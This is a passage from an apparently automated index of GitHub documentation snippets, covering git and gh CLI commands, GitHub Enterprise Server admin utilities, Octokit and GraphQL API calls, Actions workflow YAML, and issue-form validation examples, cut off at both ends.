\"redis\": \"60972d9aa486605e66b0dad4abb678dc3d9116f536579e418176eedb8abb9105\"\n    }\n  },\n  \"args\": {}\n}\n```\n\n----------------------------------------\n\nTITLE: Resource Labels for Listener Pod - YAML\nDESCRIPTION: The following YAML snippet shows the labels applied to listener pods in Actions Runner Controller. These labels provide context about the GitHub configuration (enterprise, organization, repository), scale set, and component.  They are useful for filtering logs or identifying resources associated with specific runner scale sets or GitHub configurations.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nactions.github.com/enterprise= # Will be populated if githubConfigUrl is an enterprise URL\nactions.github.com/organization= # Will be populated if githubConfigUrl is an organization URL\nactions.github.com/repository= # Will be populated if githubConfigUrl is a repository URL\nactions.github.com/scale-set-name= # Runners scale set name\nactions.github.com/scale-set-namespace= # Runners namespace\napp.kubernetes.io/component=runner-scale-set-listener\napp.kubernetes.io/part-of=gha-runner-scale-set\napp.kubernetes.io/version= # Chart version\n```\n\n----------------------------------------\n\nTITLE: Confirm local Git username\nDESCRIPTION: This snippet retrieves the locally configured Git username for a repository using the `git config user.name` command to verify if the username has been set correctly for that specific repository. The expected output is the username that was previously set for the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/setting-your-username-in-git.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ git config user.name\n> Mona Lisa\n```\n\n----------------------------------------\n\nTITLE: Creating a Namespaced Topic Branch\nDESCRIPTION: This command creates a new topic branch with a forward slash included in the name, often used to group branches by user or feature. Replace `my-username/new-codespace-policy` with your desired branch name including the namespace.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ngit checkout -b my-username/new-codespace-policy\n```\n\n----------------------------------------\n\nTITLE: Download specific workflow artifacts across all runs using gh CLI\nDESCRIPTION: Downloads specific artifacts across all runs in a repository using the `gh run download` subcommand.  `ARTIFACT_NAME-1` and `ARTIFACT_NAME-2` are replaced with the names of the artifacts to download. Requires the GitHub CLI to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh run download -n ARTIFACT_NAME-1 ARTIFACT_NAME-2\n```\n\n----------------------------------------\n\nTITLE: Pushing All Tags to a Remote Repository with Git\nDESCRIPTION: This command pushes all local tags to a remote repository. It uses the `--tags` option to indicate that all tags should be pushed.  All tags present locally will be created on the remote.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/pushing-commits-to-a-remote-repository.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngit push REMOTE-NAME --tags\n```\n\n----------------------------------------\n\nTITLE: Dry Run GitLab Pipeline Migration with Config File (Shell)\nDESCRIPTION: This command performs a dry run of a GitLab pipeline migration using a specified YAML configuration file as the source.  The `--config-file-path` specifies the path to the configuration file.  The pipeline is selected by matching the `repository_slug` in the configuration file to the `--namespace` and `--project` options.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer dry-run gitlab --namespace my-gitlab-namespace --project my-gitlab-project-name --output-dir ./output/ --config-file-path ./path/to/gitlab/config.yml\n```\n\n----------------------------------------\n\nTITLE: Connecting to the Admin Shell via SSH\nDESCRIPTION: This command establishes an SSH connection to the GitHub Enterprise Server instance as the `admin` user on port 122. It's used to access the administrative shell for troubleshooting, backups, and configuration. The hostname `github.example.com` should be replaced with the actual hostname or IP address of the GitHub Enterprise Server instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/accessing-the-administrative-shell-ssh.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ ssh -p 122 admin@github.example.com\n```\n\n----------------------------------------\n\nTITLE: Applying Configuration Changes with ghe-config-apply\nDESCRIPTION: This command applies the configuration changes to {% data variables.location.product_location %}. Running this command may restart services, causing brief downtime. It is crucial to wait for the configuration run to complete.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise/apply-configuration.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config-apply\n```\n\n----------------------------------------\n\nTITLE: Passing Headers with the `request` Method in JavaScript\nDESCRIPTION: This snippet demonstrates how to pass custom headers with the `request` method in Octokit.js. It sends a `POST` request to `/markdown/raw` with `content-type` and `x-github-api-version` headers.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nawait octokit.request(\"POST /markdown/raw\", {\n  text: \"Hello **world**\",\n  headers: {\n    \"content-type\": \"text/plain\",\n    \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Installing and changing shell with apt-get and chsh\nDESCRIPTION: This shell script installs the `csh` shell and then changes the default shell to `csh` using `chsh`. It first updates the package list using `apt-get update` and then installs `csh` using `apt-get install`.  Finally it calls `chsh` to change the default shell. This is generally done in a dotfiles repository.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/customizing-your-codespace/changing-the-shell-in-a-codespace.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nsudo apt-get update -y\nsudo apt-get install -y csh\nsudo chsh \"$(id -un)\" --shell \"/usr/bin/csh\"\n```\n\n----------------------------------------\n\nTITLE: Defining a GitHub CLI alias using gh alias set\nDESCRIPTION: This command creates an alias for a GitHub CLI command, enabling users to execute complex commands with a simpler alias. For example, creating a draft pull request using `gh prd`.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_13\n\nLANGUAGE: Shell\nCODE:\n```\ngh alias set prd \"pr create --draft\"\n```\n\n----------------------------------------\n\nTITLE: Exposing get_config function to Jinja2\nDESCRIPTION: This code shows how to make the `get_config` function available within the Jinja2 template context, resolving the `jinja2.exceptions.UndefinedError: 'get_config' is undefined.` error.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/using-copilot-to-migrate-a-project.md#_snippet_6\n\nLANGUAGE: python\nCODE:\n```\napp.jinja_env.globals.update(get_config=get_config)\n```\n\n----------------------------------------\n\nTITLE: Promoting a User (Shell)\nDESCRIPTION: Promotes the specified user account to a site administrator using the `ghe-user-promote` utility. Replace `USERNAME` with the username to promote.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_111\n\nLANGUAGE: shell\nCODE:\n```\nghe-user-promote USERNAME\n```\n\n----------------------------------------\n\nTITLE: Filter Copilot Usage\nDESCRIPTION: This snippet demonstrates how to filter metered usage to only show Copilot products. This is achieved by entering `product:copilot` in the search field of the usage report. The query returns a list of copilot products being used.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/rolling-out-github-copilot-at-scale/managing-your-companys-spending-on-github-copilot.md#_snippet_2\n\nLANGUAGE: Query\nCODE:\n```\n`product:copilot`\n```\n\n----------------------------------------\n\nTITLE: Starting Repository Migration with GraphQL Mutation\nDESCRIPTION: This GraphQL mutation initiates a repository migration, requiring parameters like source ID, owner ID, repository URL and name, access tokens, and target repository visibility. The mutation returns the ID of the migration and source URL.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-azure-devops-to-github-enterprise-cloud/migrating-repositories-from-azure-devops-to-github-enterprise-cloud.md#_snippet_2\n\nLANGUAGE: graphql\nCODE:\n```\nmutation startRepositoryMigration (\n  $sourceId: ID!,\n  $ownerId: ID!,\n  $sourceRepositoryUrl: URI!,\n  $repositoryName: String!,\n  $continueOnError: Boolean!,\n  $accessToken: String!,\n  $githubPat: String!,\n  $targetRepoVisibility: String!\n){\n  startRepositoryMigration( input: {\n    sourceId: $sourceId,\n    ownerId: $ownerId,\n    repositoryName: $repositoryName,\n    continueOnError: $continueOnError,\n    accessToken: $accessToken,\n    githubPat: $githubPat,\n    targetRepoVisibility: $targetRepoVisibility\n    sourceRepositoryUrl: $sourceRepositoryUrl,\n  }) {\n    repositoryMigration {\n      id\n      migrationSource {\n        id\n        name\n        type\n      }\n      sourceUrl\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configure datacenter name\nDESCRIPTION: This command configures the datacenter name on the primary and any replica appliances. Replace DC-NAME with a datacenter name.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/caching-repositories/configuring-a-repository-cache.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-node --datacenter DC-NAME\n```\n\n----------------------------------------\n\nTITLE: Adding Docstring to Python Function with GPT-4o\nDESCRIPTION: This code snippet demonstrates how GPT-4o can be used to add a docstring to a Python function. It includes the original function `grant_editor_access` and the docstring generated by the AI model, explaining the function's purpose, arguments, and return value. The function assigns the \"editor\" role to a specified user for a given document ID using the `AccessManager` class. GPT-4o is well-suited for generating concise and clear explanations for self-contained functions.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/ai-models/comparing-ai-models-using-different-tasks.md#_snippet_0\n\nLANGUAGE: python\nCODE:\n```\ndef grant_editor_access(user_id, doc_id):\n    access = AccessManager()\n    access.assign_role(\n        resource_type=\"document\",\n        resource_id=doc_id,\n        role=\"editor\",\n        user_id=user_id\n    )\n```\n\nLANGUAGE: python\nCODE:\n```\ndef grant_editor_access(user_id, doc_id):\n    \"\"\"\n    Grants editor access to a specific document for a given user.\n\n    This function uses the AccessManager to assign the \"editor\" role\n    to the specified user for the provided document ID.\n\n    Args:\n        user_id (str): The ID of the user to grant access to.\n        doc_id (str): The ID of the document to which access is being granted.\n    \"\"\"\n    access = AccessManager()\n    access.assign_role(\n        resource_type=\"document\",\n        resource_id=doc_id,\n        role=\"editor\",\n        user_id=user_id\n    )\n```\n\n----------------------------------------\n\nTITLE: Checking File Status with git status\nDESCRIPTION: This snippet shows how to use `git status` to verify the file renaming changes made with `git mv`. It displays the old and new filenames in the staged changes. It requires a Git repository initialized and a file renamed using `git mv`.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-files/renaming-a-file.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git status\n> # On branch YOUR-BRANCH\n> # Changes to be committed:\n> #   (use \"git reset HEAD <file>...\" to unstage)\n> #\n> #     renamed: OLD-FILENAME -> NEW-FILENAME\n> #\n\n```\n\n----------------------------------------\n\nTITLE: Registering Runner to Runner Group - Shell\nDESCRIPTION: This shell command registers a new runner and adds it to an existing runner group. It uses the `--runnergroup` parameter to specify the runner group name. The command requires the `org_or_enterprise_url` and `token` environment variables to be set. It relies on the `config.sh` script being available in the current directory.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/automatically-adding-a-runner-to-a-group.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n./config.sh --url $org_or_enterprise_url --token $token --runnergroup rg-runnergroup\n```\n\n----------------------------------------\n\nTITLE: Managing Background Jobs with ghe-aqueduct - Shell\nDESCRIPTION: This snippet demonstrates how to use the `ghe-aqueduct` utility to check the status of background jobs, pause, and resume queues in GitHub Enterprise Server. It requires SSH access to the administrative shell.  It lists queue depths and allows pausing/resuming specific queues.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ ghe-aqueduct status\n# lists queues and the number of currently queued jobs\n# for all queues\n$ ghe-aqueduct queue_depth --queue QUEUE\n# lists the number of currently queued jobs for the\n# specified queue\n$ ghe-aqueduct pause --queue QUEUE\n# pauses the specified queue\n$ ghe-aqueduct resume --queue QUEUE\n# resumes the specified queue\n```\n\n----------------------------------------\n\nTITLE: Ensuring String Values for Keys in YAML\nDESCRIPTION: This snippet addresses the '`key` must be a string' error. This error indicates that a key's value cannot be parsed as a string. The solution involves ensuring the value is enclosed in double quotes, especially if it contains special characters or if it's misinterpreted as a boolean. Empty strings or whitespace-only strings are also invalid and must be corrected or the key-value pair removed if the field is optional.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\ndescription: true\n...\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\ndescription: \"true\"\n...\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"\"\ndescription: \"File a bug report\"\nassignees: \"      \"\n...\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug Report\"\ndescription: \"File a bug report\"\n...\n```\n\n----------------------------------------\n\nTITLE: Pushing a Branch to Origin\nDESCRIPTION: This snippet demonstrates how to push the local branch to the remote origin repository. Replace BRANCH_NAME with the actual branch name you are pushing.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/reviewing-changes-in-pull-requests/checking-out-pull-requests-locally.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n[pull-inactive-pull-request] $ git push origin BRANCH_NAME\n> Counting objects: 32, done.\n> Delta compression using up to 8 threads.\n> Compressing objects: 100% (26/26), done.\n> Writing objects: 100% (29/29), 74.94 KiB | 0 bytes/s, done.\n> Total 29 (delta 8), reused 0 (delta 0)\n> To https://{% data variables.product.product_url %}/USERNAME/REPOSITORY.git\n>  * [new branch]      BRANCH_NAME -> BRANCH_NAME\n```\n\n----------------------------------------\n\nTITLE: Cleaning Settings with ghe-cleanup-settings - Shell\nDESCRIPTION: This snippet demonstrates the `ghe-cleanup-settings` utility to wipe all existing Management Console settings on GitHub Enterprise Server. It is often used when troubleshooting and requires SSH access.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nghe-cleanup-settings\n```\n\n----------------------------------------\n\nTITLE: Adding a New Tool in JavaScript\nDESCRIPTION: This describes the process of adding a new tool to the `allTools` object in the `lib/all-tools.js` file.  The key is the tag name used in the article, and the value is the display name of the tool.  New tools should be added in alphabetical order.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/creating-tool-switchers-in-articles.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n`vscode: 'Visual Studio Code'`\n```\n\n----------------------------------------\n\nTITLE: Creating a GitHub Issue with Octokit.js\nDESCRIPTION: This code snippet shows how to create a new issue on a GitHub repository using Octokit.js. It uses the `octokit.request` method with the `POST` HTTP method and specifies parameters like owner, repository, title, and body. Replace `REPO-OWNER` and `REPO-NAME` with appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nawait octokit.request(\"POST /repos/{owner}/{repo}/issues\", {\n  owner: \"{% ifversion ghes %}REPO-OWNER{% else %}octocat{% endif %}\",\n  repo: \"{% ifversion ghes %}REPO-NAME{% else %}Spoon-Knife{% endif %}\",\n  title: \"Created with the REST API\",\n  body: \"This is a test issue created by the REST API\",\n});\n```\n\n----------------------------------------\n\nTITLE: React Product Details Component\nDESCRIPTION: This React component fetches and displays product details based on the provided productId. It uses `useState` for managing product data, loading state, and error state. The `useEffect` hook is used to fetch the product data when the component mounts or when the `productId` changes. It also defines propTypes for productId.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/testing-code/create-end-to-end-tests-for-a-webpage.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport React, { useState, useEffect } from 'react';\nimport PropTypes from 'prop-types';\n\nconst ProductDetails = ({ productId = '1' }) => {\n  const [product, setProduct] = useState(null);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState(null);\n\n  useEffect(() => {\n    const fetchProduct = async () => {\n      try {\n        const response = await fetch(`/api/product/${productId}`);\n        if (!response.ok) {\n          throw new Error('Product not found');\n        }\n        const data = await response.json();\n        setProduct(data);\n        setLoading(false);\n      } catch (err) {\n        setError(err.message);\n        setLoading(false);\n      }\n    };\n\n    fetchProduct();\n    return;\n  }, [productId]); // Add productId to dependency array\n\n  if (loading) return <div>Loading...</div>;\n  if (error) return <div>Error: {error}</div>;\n\n  return (\n    <div>\n      {product && (\n        <div>\n          <h2>{product.name}</h2>\n          <p>{product.description}</p>\n          <p>Price: ${product.price}</p>\n        </div>\n      )}\n    </div>\n  );\n};\n\nProductDetails.propTypes = {\n  productId: PropTypes.string\n};\n\nexport default ProductDetails;\n```\n\n----------------------------------------\n\nTITLE: Making a Request with the `request` Method in JavaScript\nDESCRIPTION: This snippet demonstrates how to make a request using the `request` method in Octokit.js.  It performs a `GET` request to `/repos/{owner}/{repo}/issues` with parameters for `owner`, `repo`, and `per_page`.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nawait octokit.request(\"GET /repos/{owner}/{repo}/issues\", {\n  owner: \"github\",\n  repo: \"docs\",\n  per_page: 2\n});\n```\n\n----------------------------------------\n\nTITLE: Removing Invalid Keys in YAML Issue Form\nDESCRIPTION: This example demonstrates the \"body[i]: `x` is not a permitted key\" error. It arises when an unrecognized key (e.g., `x`) is present at the same indentation level as `type` and `attributes`. The corrected example removes the invalid key, leaving only the valid keys.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: markdown\n  x: woof\n  attributes:\n    value: \"Thanks for taking the time to fill out this bug! If you need real-time help, join us on Discord.\"\n```\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: markdown\n  attributes:\n    value: \"Thanks for taking the time to fill out this bug! If you need real-time help, join us on Discord.\"\n```\n\n----------------------------------------\n\nTITLE: Renaming a File using git mv command\nDESCRIPTION: This snippet demonstrates how to rename a file in a Git repository using the `git mv` command.  It renames the file locally and stages the changes for commit.  The command takes two arguments: the old filename and the new filename.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-files/renaming-a-file.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit mv OLD-FILENAME NEW-FILENAME\n```\n\n----------------------------------------\n\nTITLE: Ensuring Non-Markdown Fields in Body of YAML\nDESCRIPTION: This snippet addresses the 'Body must contain at least one non-markdown field' error. This error occurs when the `body` array only includes `markdown` elements, which are static text. The fix involves adding at least one non-markdown element that accepts user input, such as `textarea` or `input`, to ensure that the issue form collects user input.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: markdown\n  attributes:\n    value: \"Bugs are the worst!\"\n\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: markdown\n  attributes:\n    value: \"Bugs are the worst!\"\n- type: textarea\n  attributes:\n    label: \"What's wrong?\"\n\n```\n\n----------------------------------------\n\nTITLE: Generating and Masking a Secret in a Single Job (PowerShell)\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow job using PowerShell to generate a random secret, mask it using `add-mask`, and then make it available as an output to other steps within the same job.  It demonstrates a PowerShell-based approach to secret masking.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_20\n\nLANGUAGE: yaml\nCODE:\n```\non: push\njobs:\n  generate-a-secret-output:\n    runs-on: ubuntu-latest\n    steps:\n      - id: sets-a-secret\n        name: Generate, mask, and output a secret\n        shell: pwsh\n        run: |\n          Set-Variable -Name TheSecret -Value (Get-Random)\n          Write-Output \"::add-mask::$TheSecret\"\n          \"secret-number=$TheSecret\" >> $env:GITHUB_OUTPUT\n      - name: Use that secret output (protected by a mask)\n        shell: pwsh\n        run: |{% raw %}\n          Write-Output \"the secret number is ${{ steps.sets-a-secret.outputs.secret-number }}\"{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Checking Disk Usage of /var/log Folder\nDESCRIPTION: This command uses `du` to calculate the disk usage of the `/var/log` directory and its contents, providing a summary of the space occupied by each subdirectory and file, as well as the total usage.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/troubleshooting-resource-allocation-problems.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nsudo du -csh /var/log/*\n```\n\n----------------------------------------\n\nTITLE: Deactivating Copilot Language Allow List - XML\nDESCRIPTION: This XML snippet demonstrates how to deactivate GitHub Copilot for all languages. The wildcard character '*' is used as the key with a value of 'false'.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/configuring-github-copilot-in-your-environment.md#_snippet_2\n\nLANGUAGE: XML\nCODE:\n```\n<application>\n  <component name=\"github-copilot\">\n    <languageAllowList>\n      <map>\n        <entry key=\"*\" value=\"false\" />\n      </map>\n    </languageAllowList>\n  </component>\n</application>\n```\n\n----------------------------------------\n\nTITLE: Powering Off the Appliance\nDESCRIPTION: This command shuts down the GitHub Enterprise Server appliance. It is used before detaching the data disk or replacing the root disk in the hypervisor.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/updating-the-virtual-machine-and-physical-resources/increasing-storage-capacity.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nsudo poweroff\n```\n\n----------------------------------------\n\nTITLE: Authenticating with {% data variables.product.github %} CLI\nDESCRIPTION: This snippet shows how to authenticate to {% data variables.product.github %} from the command line using the {% data variables.product.prodname_cli %}. It uses the `gh auth login` command to initiate the authentication process and prompts the user to choose an authentication method.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/getting-started-with-git.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh auth login\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_BUILDS_DIR to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_BUILDS_DIR` to the GitHub Actions equivalent `${{ github.workspace }}`. This variable represents the workspace directory in GitHub Actions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_16\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.workspace }}\n```\n\n----------------------------------------\n\nTITLE: Using `strategy.job-index` in GitHub Actions YAML\nDESCRIPTION: This YAML snippet demonstrates how to use the `strategy.job-index` property to create unique log file names for each job in a matrix. This is useful for differentiating logs generated by parallel jobs in a matrix strategy.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_17\n\nLANGUAGE: yaml\nCODE:\n```\nname: Test strategy\non: push\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        test-group: [1, 2]\n        node: [14, 16]\n    steps:\n      - run: echo \"Mock test logs\" > test-job-{% raw %}${{ strategy.job-index }}{% endraw %}.txt\n      - name: Upload logs\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: Build log for job {% raw %}${{ strategy.job-index }}{% endraw %}\n          path: test-job-{% raw %}${{ strategy.job-index }}{% endraw %}.txt\n```\n\n----------------------------------------\n\nTITLE: Initializing Octokit App for Webhook Handling\nDESCRIPTION: This code snippet demonstrates initializing an Octokit App instance with App ID, private key, and webhook secret for handling webhook events. Replace `APP_ID`, `PRIVATE_KEY`, and `WEBHOOK_SECRET` with the appropriate values. This allows the app to securely process incoming webhooks.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app-installation.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nimport { App } from \"octokit\";\n\nconst app = new App({\n  appId: APP_ID,\n  privateKey: PRIVATE_KEY,\n  webhooks: { WEBHOOK_SECRET },\n});\n```\n\n----------------------------------------\n\nTITLE: Updating an Iteration Field using GraphQL with curl\nDESCRIPTION: This snippet demonstrates how to update an iteration field for a project item using the GitHub GraphQL API and `curl`. It requires replacing `PROJECT_ID`, `ITEM_ID`, `FIELD_ID`, and `ITERATION_ID` with the appropriate values. The API key should be provided as a bearer token in the `Authorization` header.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_25\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: Bearer TOKEN' \\\n  --data '{\"query\":\"mutation {updateProjectV2ItemFieldValue( input: { projectId: \\\"PROJECT_ID\\\" itemId: \\\"ITEM_ID\\\" fieldId: \\\"FIELD_ID\\\" value: { iterationId: \\\"ITERATION_ID\\\" }}) { projectV2Item { id }}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Evacuating Pages Storage Service (ghe-dpages evacuate)\nDESCRIPTION: This subcommand of `ghe-dpages` evacuates a GitHub Pages storage service.  It's used before evacuating a cluster node to ensure data is safely migrated. `pages-server-UUID` must be replaced with the actual UUID of the pages server.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_46\n\nLANGUAGE: shell\nCODE:\n```\nghe-dpages evacuate pages-server-UUID\n```\n\n----------------------------------------\n\nTITLE: dind-rootless Example Configuration - YAML\nDESCRIPTION: This example YAML configuration shows the necessary settings for running dind-rootless. This includes settings like githubConfigUrl, githubConfigSecret, maxRunners, minRunners, runnerGroup and template section. It gives a glimpse of complete runner scale set values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_26\n\nLANGUAGE: yaml\nCODE:\n```\n## githubConfigUrl is the GitHub url for where you want to configure runners\n## ex: https://github.com/myorg/myrepo or https://github.com/myorg\ngithubConfigUrl: \"https://github.com/actions/actions-runner-controller\"\n\n## githubConfigSecret is the k8s secrets to use when auth with GitHub API.\n## You can choose to use GitHub App or a PAT token\ngithubConfigSecret: my-super-safe-secret\n\n## maxRunners is the max number of runners the autoscaling runner set will scale up to.\nmaxRunners: 5\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\nminRunners: 0\n\nrunnerGroup: \"my-custom-runner-group\"\n\n## name of the runner scale set to create. Defaults to the helm release name\nrunnerScaleSetName: \"my-awesome-scale-set\"\n\n## template is the PodSpec for each runner Pod\n```\n\n----------------------------------------\n\nTITLE: Publishing a Gem Package\nDESCRIPTION: This command publishes a gem package to the GitHub Packages registry. NAMESPACE should be replaced with the account or organization name, and GEM_NAME with the name of the gem.  Conditional logic handles registry URL configuration based on deployment environment.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-rubygems-registry.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n$ gem push --key github \\\n   --host https://{% ifversion fpt or ghec %}rubygems.pkg.github.com{% else %}REGISTRY_URL{% endif %}/NAMESPACE \\\n   GEM_NAME-0.0.1.gem\n```\n\n----------------------------------------\n\nTITLE: Accept Header for Text Match Metadata\nDESCRIPTION: This shell command shows how to include the `Accept` header in a `curl` request to retrieve text match metadata in search results. This metadata includes information about the position of the search terms within the text and the property that includes the search term.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/search/search.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\napplication/vnd.github.text-match+json\n```\n\n----------------------------------------\n\nTITLE: Initial Replica Setup\nDESCRIPTION: This command initiates the replica setup process, connecting the repository cache to the primary instance. If the cache is the only replica, no arguments are required. It configures the replication from the primary instance defined by PRIMARY-IP.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/caching-repositories/configuring-a-repository-cache.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-setup PRIMARY-IP\n```\n\n----------------------------------------\n\nTITLE: Updating a Check Run with RuboCop Results - Ruby\nDESCRIPTION: This Ruby code snippet updates a GitHub check run using the `@installation_client`.  It sets the `status` to 'completed', the `conclusion` based on RuboCop results (success or neutral), and includes output details such as the title, summary, text, and annotations.  It also adds an action that will display a button in the GitHub UI enabling the user to request the check run take an action by clicking the button, specified via the `identifier` field.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\n        # Mark the check run as complete! And if there are warnings, share them.\n        @installation_client.update_check_run(\n          @payload['repository']['full_name'],\n          @payload['check_run']['id'],\n          status: 'completed',\n          conclusion: conclusion,\n          output: {\n            title: 'Octo RuboCop',\n            summary: summary,\n            text: text,\n            annotations: annotations\n          },\n          actions: [{\n            label: 